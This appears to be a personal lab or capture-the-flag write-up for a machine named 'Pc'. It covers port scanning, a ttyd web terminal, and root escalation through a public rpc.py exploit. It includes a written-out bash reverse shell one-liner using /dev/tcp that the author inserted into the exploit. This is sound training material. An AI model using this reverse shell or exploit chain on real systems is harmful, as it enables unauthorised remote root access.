# Pc

## Enumeration & scanning

- Open ports are 22 and 8000.
- Port 8000 hosts ttyd for online terminal.
- Only a root flag can be found.

``` sh
# Default scanning
sudo nmap -p- 192.168.140.210  
sudo nmap -p- 192.168.140.210     
```

## Privilege Escalation

- Terminal gives access to user with limited privileges
- Listing processes reveals that `root` is running `rpc.py`
- Look up `rpc.py`, obscure app and vulnerability with exploit exists. Vulnerability was never fixed.
- See something is running on port `65432`, appears to be `rpc.py` according to exploit code.
- Execute exploit and gain root privileges. Needed to fix exploit code a bit by removing some strings after `=` characters and put in reverse shell.

``` sh
# Run lse.sh
python3 -m http.server 80
wget http://192.168.45.226/lse.sh
chmod +x lse.sh
./lse.sh -l1

# Put trusty reverse shell in exploit
bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"
```

## References

- https://www.exploit-db.com/exploits/50983
- https://medium.com/@elias.hohl/remote-code-execution-0-day-in-rpc-py-709c76690c30

## Rabbit holes

- Took to long to realize that only `root` flag must be found.
- Looked to long into `ttyd` app itself. Tried to run it again but with different permissions on other port.
- Linpeas outputted `supervisord` notes but didn't look into them. The folder of it contained config file for execution of `rpc.py`.
